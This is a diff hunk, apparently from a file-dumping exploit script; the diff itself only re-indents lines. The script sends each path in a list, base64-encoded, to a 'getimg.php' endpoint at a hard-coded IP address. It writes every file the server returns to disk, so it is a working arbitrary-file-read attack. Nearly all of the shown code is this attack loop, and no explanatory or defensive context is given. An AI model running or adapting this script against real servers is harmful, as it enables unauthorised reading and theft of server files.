@@ -46,14 +46,14 @@ tasks = [
 for i in tasks:
     folder = i.split('/')
     if len(folder) > 1:
-        folder = '/'.join(folder[:-1])
-        os.makedirs(folder, exist_ok=True)
-        print(f'[!] folder {folder} created')
+       folder = '/'.join(folder[:-1])
+       os.makedirs(folder, exist_ok=True)
+       print(f'[!] folder {folder} created')
     b = base64.b64encode(i.encode('ascii'))
     r = requests.get('http://3.91.17.218/getimg.php', params={'img': b})
     if r.text.find('No such file or directory') == -1:
-        print(f'[+] found {i}')
-        with open(i, 'wb') as f:
+       print(f'[+] found {i}')
+       with open(i, 'wb') as f:
             f.write(r.content)
     else:
-        print(f'[X] {i} not found')
+       print(f'[X] {i} not found')
